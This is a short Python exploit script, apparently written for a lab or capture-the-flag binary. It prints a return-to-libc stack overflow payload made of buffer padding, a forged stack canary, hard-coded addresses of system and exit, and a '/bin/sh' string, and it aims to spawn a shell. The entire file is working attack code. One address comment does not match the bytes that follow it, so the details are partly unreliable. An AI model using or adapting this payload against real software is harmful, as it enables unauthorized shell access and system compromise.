#! /usr/bin/python

exp = ""

# Fill the buffer and any locals
exp += 16 * 'A'

# Replace the canary
exp += "UUUU"

# Fill the Function args??? and the old base pointer
exp += 12 * 'B'

# 0xf7e3f950: system
exp += "\x50\xf9\xe3\xf7"

# 0xffffcfd8: Address of the string
exp +="\xf0\xcf\xff\xff"

# 0xf7e337c0: address of exit function
exp += "\xc0\x37\xe3\xf7"


# String
exp += "/bin/sh"

print(exp)




